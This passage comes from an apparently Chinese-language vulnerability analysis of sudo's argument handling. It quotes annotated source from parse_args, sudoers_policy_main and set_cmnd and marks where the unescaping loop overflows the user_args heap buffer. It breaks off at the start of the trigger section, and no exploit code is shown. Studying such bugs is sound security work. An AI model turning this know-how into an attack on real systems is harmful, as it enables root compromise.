</span><span class="cp">#define MODE_LONG_LIST		0x01000000
</span></code></pre></div></li>
<li>
<p>在<code>sudo.c</code>中找到<code>main</code>函数，可以看到在初始配置并获取一些配置文件之后，通过<code>parse_args</code>函数<code>parse</code>了命令行参数，赋给<code>sudo_mode</code>并输出信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span>
<span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[])</span>
<span class="p">{</span>
<span class="cm">/*...*/</span>
<span class="cm">/* Disable core dumps if not enabled in sudo.conf. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sudo_conf_disable_coredump</span><span class="p">())</span>
	<span class="n">disable_coredump</span><span class="p">();</span>

    <span class="cm">/* Parse command line arguments. */</span>
    <span class="n">sudo_mode</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargc</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">settings</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">env_add</span><span class="p">);</span>
    <span class="n">sudo_debug_printf</span><span class="p">(</span><span class="n">SUDO_DEBUG_DEBUG</span><span class="p">,</span> <span class="s">&#34;sudo_mode %d&#34;</span><span class="p">,</span> <span class="n">sudo_mode</span><span class="p">);</span>

    <span class="cm">/* Print sudo version early, in case of plugin init failure. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">sudo_mode</span><span class="p">,</span> <span class="n">MODE_VERSION</span><span class="p">))</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">_</span><span class="p">(</span><span class="s">&#34;Sudo version %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">),</span> <span class="n">PACKAGE_VERSION</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">user_details</span><span class="p">.</span><span class="n">uid</span> <span class="o">==</span> <span class="n">ROOT_UID</span><span class="p">)</span>
	    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="n">_</span><span class="p">(</span><span class="s">&#34;Configure options: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">),</span> <span class="n">CONFIGURE_ARGS</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></li>
<li>
<p>追踪定义，在<code>parse_args.c</code>中定位到<code>parse_args</code>函数，其中代码检测是否开启<code>MODE_RUN</code>和<code>MODE_SHELL(MODE_LOGIN_SHELL)</code>标志位，若满足条件，检测<code>argv</code>中字符，若有<code>字母数字_-$</code>之外的字符，在其前添加转义符号<code>\</code>，重写<code>argv</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cm">/*
</span><span class="cm"> * Command line argument parsing.
</span><span class="cm"> * Sets nargc and nargv which corresponds to the argc/argv we&#39;ll use
</span><span class="cm"> * for the command to be run (if we are running one).
</span><span class="cm"> */</span>
<span class="kt">int</span>
<span class="nf">parse_args</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">nargc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">***</span><span class="n">nargv</span><span class="p">,</span>
    <span class="k">struct</span> <span class="nc">sudo_settings</span> <span class="o">**</span><span class="n">settingsp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">***</span><span class="n">env_addp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>		<span class="cm">/* what mode is sudo to be run in? */</span>
    <span class="kt">int</span> <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>		<span class="cm">/* mode flags */</span>

    <span class="p">...</span>
    <span class="err">通过</span><span class="n">sudoedit发起时</span><span class="err">，模式为</span><span class="n">MODE_EDIT</span>
		<span class="cm">/* First, check to see if we were invoked as &#34;sudoedit&#34;. */</span>
    <span class="n">proglen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">progname</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">proglen</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">progname</span> <span class="o">+</span> <span class="n">proglen</span> <span class="o">-</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#34;edit&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">progname</span> <span class="o">=</span> <span class="s">&#34;sudoedit&#34;</span><span class="p">;</span>
	<span class="n">mode</span> <span class="o">=</span> <span class="n">MODE_EDIT</span><span class="p">;</span>
	<span class="n">sudo_settings</span><span class="p">[</span><span class="n">ARG_SUDOEDIT</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="p">;</span>
    <span class="p">}</span>

<span class="err">当</span><span class="o">-</span><span class="n">i</span><span class="err">、</span><span class="o">-</span><span class="n">s时</span><span class="err">，开启</span><span class="n">MODE_SHELL标志位</span>
<span class="p">...</span>
<span class="k">case</span> <span class="sc">&#39;i&#39;</span><span class="o">:</span>
		    <span class="n">sudo_settings</span><span class="p">[</span><span class="n">ARG_LOGIN_SHELL</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="p">;</span>
		    <span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_LOGIN_SHELL</span><span class="p">);</span>
		    <span class="k">break</span><span class="p">;</span>
<span class="k">case</span> <span class="sc">&#39;s&#39;</span><span class="o">:</span>
		    <span class="n">sudo_settings</span><span class="p">[</span><span class="n">ARG_USER_SHELL</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="p">;</span>
		    <span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="p">);</span>
<span class="p">....</span>

<span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_LOGIN_SHELL</span><span class="p">))</span> <span class="p">{</span>
				<span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
</span><span class="cm">     * For shell mode we need to rewrite argv
</span><span class="cm">     */</span>
     <span class="c1">// 若shell模式-c参数下运行，会重写参数
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="n">MODE_RUN</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="p">))</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">,</span> <span class="o">*</span><span class="n">cmnd</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ac</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	    <span class="cm">/* shell -c &#34;command&#34; */</span>
	    <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="o">*</span><span class="n">dst</span><span class="p">;</span>
	    <span class="n">size_t</span> <span class="n">cmnd_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">argc</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span>
		<span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">argc</span> <span class="o">-</span> <span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

	    <span class="n">cmnd</span> <span class="o">=</span> <span class="n">dst</span> <span class="o">=</span> <span class="n">reallocarray</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">cmnd_size</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">cmnd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="n">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
	    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">gc_add</span><span class="p">(</span><span class="n">GC_PTR</span><span class="p">,</span> <span class="n">cmnd</span><span class="p">))</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

<span class="c1">//字符转义！用&#34;\&#34;
</span><span class="c1"></span>	    <span class="k">for</span> <span class="p">(</span><span class="n">av</span> <span class="o">=</span> <span class="n">argv</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">src</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="o">*</span><span class="n">src</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="cm">/* quote potential meta characters */</span>
		    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isalnum</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">src</span> <span class="o">!=</span> <span class="sc">&#39;_&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">src</span> <span class="o">!=</span> <span class="sc">&#39;-&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">src</span> <span class="o">!=</span> <span class="sc">&#39;$&#39;</span><span class="p">)</span>
			<span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
		    <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">cmnd</span> <span class="o">!=</span> <span class="n">dst</span><span class="p">)</span>
		<span class="n">dst</span><span class="o">--</span><span class="p">;</span>  <span class="cm">/* replace last space with a NUL */</span>
	    <span class="o">*</span><span class="n">dst</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>

	    <span class="n">ac</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span> <span class="cm">/* -c cmnd */</span>
	<span class="p">}</span>

  <span class="c1">// 重新写argv, 保存在av中
</span><span class="c1"></span>	<span class="n">av</span> <span class="o">=</span> <span class="n">reallocarray</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">ac</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	    <span class="n">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">gc_add</span><span class="p">(</span><span class="n">GC_PTR</span><span class="p">,</span> <span class="n">av</span><span class="p">))</span>
	    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

	<span class="n">av</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">user_details</span><span class="p">.</span><span class="n">shell</span><span class="p">;</span> <span class="cm">/* plugin may override shell */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">cmnd</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	    <span class="n">av</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-c&#34;</span><span class="p">;</span>
	    <span class="n">av</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmnd</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">av</span><span class="p">[</span><span class="n">ac</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="n">argv</span> <span class="o">=</span> <span class="n">av</span><span class="p">;</span>
	<span class="n">argc</span> <span class="o">=</span> <span class="n">ac</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></li>
<li>
<p>回到<code>sudo.c</code>，刚刚将<code>parse_args</code>函数处理对特殊字符转义后的结果反馈给<code>sudo_mode</code>。接下来进行插件加载，调用<code>load_plugins.c</code>中的<code>sudo_load_plugins</code>，默认为加载<code>sudoers</code>插件。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// in sudo.c
</span><span class="c1"></span><span class="cm">/* Parse command line arguments. */</span>
    <span class="n">sudo_mode</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargc</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">settings</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">env_add</span><span class="p">);</span>
    <span class="n">sudo_debug_printf</span><span class="p">(</span><span class="n">SUDO_DEBUG_DEBUG</span><span class="p">,</span> <span class="s">&#34;sudo_mode %d&#34;</span><span class="p">,</span> <span class="n">sudo_mode</span><span class="p">);</span>
<span class="cm">/* Load plugins. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sudo_load_plugins</span><span class="p">(</span><span class="o">&amp;</span><span class="n">policy_plugin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">io_plugins</span><span class="p">))</span>
	<span class="n">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;fatal error, unable to load plugins&#34;</span><span class="p">));</span>
<span class="err">在刚刚的</span><span class="n">parse_args函数调用之后</span>
<span class="p">....</span>
    <span class="cm">/* Open policy plugin. */</span>
    <span class="n">ok</span> <span class="o">=</span> <span class="n">policy_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">policy_plugin</span><span class="p">,</span> <span class="n">settings</span><span class="p">,</span> <span class="n">user_info</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ok</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ok</span> <span class="o">==</span> <span class="o">-</span><span class="mi">2</span><span class="p">)</span>
	    <span class="n">usage</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="k">else</span>
	    <span class="nf">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to initialize policy plugin&#34;</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></li>
<li>
<p><code>sudo_load_plugins</code>读取<code>sudo</code>的配置文件加载插件，若没有（即默认情况）只加载<code>sudoers</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp">
<span class="c1">// load_plugins.c
</span><span class="c1"></span><span class="kt">bool</span>
<span class="nf">sudo_load_plugins</span><span class="p">(</span><span class="k">struct</span> <span class="nc">plugin_container</span> <span class="o">*</span><span class="n">policy_plugin</span><span class="p">,</span>
    <span class="k">struct</span> <span class="nc">plugin_container_list</span> <span class="o">*</span><span class="n">io_plugins</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span><span class="n">check_policy是函数指针</span>
<span class="k">if</span> <span class="p">(</span><span class="n">policy_plugin</span><span class="o">-&gt;</span><span class="n">u</span><span class="p">.</span><span class="n">policy</span><span class="o">-&gt;</span><span class="n">check_policy</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;policy plugin %s does not include a check_policy method&#34;</span><span class="p">),</span>
	    <span class="n">policy_plugin</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="p">...}</span>
</code></pre></div></li>
<li>
<p>上面的<code>check_policy</code>对应<code>sudoers</code>的<code>policy.c</code>中调用<code>sudoers_policy_check</code>函数，调用了<code>sudoers.c</code>中的<code>sudoers_policy_main</code>函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// plugins/sudoers/policy.c
</span><span class="c1"></span><span class="k">static</span> <span class="kt">int</span>
<span class="nf">sudoers_policy_check</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="n">env_add</span><span class="p">[],</span>
    <span class="kt">char</span> <span class="o">**</span><span class="n">command_infop</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv_out</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">**</span><span class="n">user_env_out</span><span class="p">[])</span>
<span class="p">{</span>
<span class="p">...</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">sudoers_policy_main</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">env_add</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exec_args</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></li>
<li>
<p>观察到在<code>sudoers_policy_main</code>中调用了<code>set_cmnd</code>函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// plugins/sudoers/sudoers.c
</span><span class="c1"></span><span class="kt">int</span>
<span class="nf">sudoers_policy_main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">pwflag</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">env_add</span><span class="p">[],</span>
    <span class="kt">bool</span> <span class="n">verbose</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">closure</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
<span class="cm">/* Find command in path and apply per-command Defaults. */</span>
    <span class="n">cmnd_status</span> <span class="o">=</span> <span class="n">set_cmnd</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cmnd_status</span> <span class="o">==</span> <span class="n">NOT_FOUND_ERROR</span><span class="p">)</span>
	<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></li>
<li>
<p>「漏洞点」<code>set_cmnd</code>中根据标志位，设置<code>user_</code>开头的多个变量值。下面的片段将复制的<code>argv</code>(这里称为<code>NewArgv</code>)赋值给<code>user_args</code>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cm">/*
</span><span class="cm"> * Fill in user_cmnd, user_args, user_base and user_stat variables
</span><span class="cm"> * and apply any command-specific defaults entries.
</span><span class="cm"> */</span>
<span class="k">static</span> <span class="kt">int</span>
<span class="nf">set_cmnd</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">sudo_mode</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">MODE_RUN</span> <span class="o">|</span> <span class="n">MODE_EDIT</span> <span class="o">|</span> <span class="n">MODE_CHECK</span><span class="p">))</span> <span class="p">{</span>
<span class="cm">/* set user_args */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">NewArgc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	    <span class="kt">char</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="o">**</span><span class="n">av</span><span class="p">;</span>
	    <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>

	    <span class="cm">/* Alloc and build up user_args. */</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span>
		<span class="n">size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">av</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">// 这里看到user_args申请了和argv中参数相同的大小的堆空间
</span><span class="c1">// NewArgv是前面sudoers_policy_main函数中处理过的，复制了argv的内容
</span><span class="c1">//		special handling for pseudo-commands and &#39;-i&#39;
</span><span class="c1"></span>	    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">user_args</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
		<span class="n">debug_return_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	    <span class="p">}</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">sudo_mode</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="o">|</span><span class="n">MODE_LOGIN_SHELL</span><span class="p">))</span> <span class="p">{</span>
		<span class="cm">/*
</span><span class="cm">		 * When running a command via a shell, the sudo front-end
</span><span class="cm">		 * escapes potential meta chars.  We unescape non-spaces
</span><span class="cm">		 * for sudoers matching and logging purposes.
</span><span class="cm">		 */</span>
<span class="c1">//这里！！！！！依次将命令行参数链接到user_args中
</span><span class="c1"></span>		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="o">*--</span><span class="n">to</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
	    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="n">n</span> <span class="o">=</span> <span class="n">strlcpy</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="o">*</span><span class="n">av</span><span class="p">,</span> <span class="n">size</span> <span class="o">-</span> <span class="p">(</span><span class="n">to</span> <span class="o">-</span> <span class="n">user_args</span><span class="p">));</span>
		    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;=</span> <span class="n">size</span> <span class="o">-</span> <span class="p">(</span><span class="n">to</span> <span class="o">-</span> <span class="n">user_args</span><span class="p">))</span> <span class="p">{</span>
			<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;internal error, %s overflow&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">);</span>
			<span class="n">debug_return_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		    <span class="p">}</span>
		    <span class="n">to</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="o">*--</span><span class="n">to</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
	    <span class="p">}</span>
	<span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p>漏洞触发</p>
<ul>
<li>
<p>如何满足漏洞点处的触发条件？</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">int</span>
<span class="nf">set_cmnd</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="p">.....</span>
    <span class="c1">//获取所有命令行参数的长度
</span><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span>
    <span class="n">size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">av</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">user_args</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
    <span class="n">debug_return_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
